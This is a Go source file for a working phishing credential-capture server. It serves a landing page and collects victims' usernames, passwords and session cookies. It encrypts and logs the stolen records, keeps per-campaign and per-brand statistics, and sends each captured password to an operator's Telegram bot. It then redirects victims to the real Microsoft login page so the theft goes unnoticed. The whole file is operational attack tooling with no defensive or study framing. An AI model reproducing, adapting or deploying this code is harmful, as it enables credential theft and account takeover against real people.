package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"embed"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"time"
)

//go:embed index.html
var landingPage embed.FS

var (
	storageKey     []byte
	telegramToken  string
	telegramChatID string
)

func main() {
	keyB64 := os.Getenv("STORAGE_KEY")
	if keyB64 == "" {
		log.Fatal("STORAGE_KEY env var required (base64-encoded 32-byte AES key). Generate: go run ../payload-generator/keygen.go")
	}
	var err error
	storageKey, err = base64.StdEncoding.DecodeString(keyB64)
	if err != nil || len(storageKey) != 32 {
		log.Fatal("STORAGE_KEY must be base64-encoded 32-byte AES key")
	}

	port := os.Getenv("PORT")
	if port == "" {
		port = "9090"
	}

	telegramToken = os.Getenv("TELEGRAM_BOT_TOKEN")
	telegramChatID = os.Getenv("TELEGRAM_CHAT_ID")

	redirectURL := os.Getenv("REDIRECT_URL")
	if redirectURL == "" {
		redirectURL = "https://login.microsoftonline.com"
	}

	mux := http.NewServeMux()
	mux.HandleFunc("POST /capture", handleCapture(redirectURL))
	mux.HandleFunc("GET /healthz", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("ok"))
	})

	// Serve the landing page (with embedded JS decryptor) at /
	landingHTML, err := landingPage.ReadFile("index.html")
	if err != nil {
		log.Fatalf("FATAL: cannot read embedded index.html: %v", err)
	}
	log.Printf("Landing page loaded: %d bytes", len(landingHTML))
	mux.HandleFunc("GET /{$}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write(landingHTML)
	})

	log.Printf("Capture backend + landing page listening on :%s (redirect: %s)", port, redirectURL)
	log.Fatal(http.ListenAndServe(":"+port, mux))
}

func handleCapture(redirectURL string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if err := r.ParseForm(); err != nil {
			http.Error(w, "bad form", http.StatusBadRequest)
			return
		}

		username := r.FormValue("username")
		password := r.FormValue("password")
		uuid := r.FormValue("uuid")
		cookies := r.FormValue("cookies")

		log.Printf("[CAPTURE] uuid=%s username=%s ip=%s ua=%s",
			uuid, username, r.RemoteAddr, r.UserAgent())

		data := map[string]interface{}{
			"timestamp":  time.Now().UTC().Format(time.RFC3339),
			"username":   username,
			"password":   password,
			"uuid":       uuid,
			"cookies":    cookies,
			"ip":         r.RemoteAddr,
			"user_agent": r.UserAgent(),
		}
		// Write analytics event to shared JSONL
		campaignID := r.FormValue("campaign")
		status := "success"
		if username == "" && password == "" {
			status = "failed"
		}
		brand := r.FormValue("brand")
		if brand == "" {
			brand = "unknown"
		}
		writeEvent(map[string]interface{}{
			"timestamp":   time.Now().UTC().Format(time.RFC3339),
			"campaign_id": campaignID,
			"brand":       brand,
			"username":    username,
			"ip":          r.RemoteAddr,
			"user_agent":  r.UserAgent(),
			"status":      status,
			"source":      "capture",
		})

		// Send Telegram notification on successful captures
		if status == "success" && username != "" {
			go notifyTelegram(campaignID, brand, username, password, r)
		}

		raw, _ := json.Marshal(data)

		encrypted, err := encryptAESGCM(raw, storageKey)
		if err != nil {
			log.Printf("[ERROR] encrypt: %v", err)
			http.Error(w, "internal error", http.StatusInternalServerError)
			return
		}

		// Write encrypted data to stdout (can be piped to file in production)
		fmt.Printf("CAPTURE: %s\n", base64.StdEncoding.EncodeToString(encrypted))

		http.Redirect(w, r, redirectURL, http.StatusFound)
	}
}

func encryptAESGCM(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func notifyTelegram(campaignID, brand, username, password string, r *http.Request) {
	if telegramToken == "" || telegramChatID == "" {
		return
	}
	captureTime := time.Now().UTC().Format("2006-01-02 15:04:05 MST")
	msg := fmt.Sprintf("🔴 CAPTURE | %s | %s\n"+
		"Username: %s\n"+
		"Password: %s\n"+
		"IP: %s\n"+
		"User-Agent: %s\n"+
		"Time: %s\n"+
		"Campaign: %s",
		brand, username,
		username, password,
		r.RemoteAddr, r.UserAgent(),
		captureTime, campaignID)
	sendTelegramMessage(msg)
}

func sendTelegramMessage(text string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramToken)
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	w.WriteField("chat_id", telegramChatID)
	w.WriteField("text", text)
	w.Close()
	req, _ := http.NewRequest("POST", url, &buf)
	req.Header.Set("Content-Type", w.FormDataContentType())
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("[telegram] send error: %v", err)
		return
	}
	resp.Body.Close()
	log.Printf("[telegram] notification sent")
}

func writeEvent(ev map[string]interface{}) {
	raw, err := json.Marshal(ev)
	if err != nil {
		log.Printf("[jsonl] marshal error: %v", err)
		return
	}
	f, err := os.OpenFile("../data/captures.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("[jsonl] open error: %v", err)
		return
	}
	defer f.Close()
	if _, err := f.Write(append(raw, '\n')); err != nil {
		log.Printf("[jsonl] write error: %v", err)
	}
}
